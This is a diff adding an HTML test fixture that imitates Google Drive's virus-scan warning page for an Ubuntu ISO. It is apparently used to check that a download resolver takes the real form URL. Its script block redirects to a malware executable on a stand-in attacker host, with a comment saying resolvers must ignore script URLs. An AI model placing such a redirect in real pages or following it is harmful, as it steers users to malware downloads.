@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google Drive - Virus scan warning</title>
+  <script>
+    // Resolvers must never execute scripts or take URLs from script blocks
+    window.location.href = "https://evil.example.com/malware.exe";
+  </script>
+</head>
+<body>
+  <div class="uc-main">
+    <p class="uc-warning-caption">Google Drive can't scan this file for viruses.</p>
+    <p class="uc-name-size"><a href="/open?id=1AbCdEfGhIjKlMnOpQrStUvWxYz_01234">ubuntu-24.04-desktop-amd64.iso</a> (4.7G)</p>
+    <form id="download-form" action="https://drive.usercontent.google.com/download" method="get">
+      <input type="hidden" name="id" value="1AbCdEfGhIjKlMnOpQrStUvWxYz_01234">
+      <input type="hidden" name="export" value="download">
+      <input type="hidden" name="confirm" value="t">
+      <input type="hidden" name="uuid" value="9f8e7d6c-1234-4a5b-8c9d-0e1f2a3b4c5d">
+      <input type="submit" id="uc-download-link" class="goog-inline-block jfk-button jfk-button-action" value="Download anyway">
+    </form>
+  </div>
+</body>
+</html>
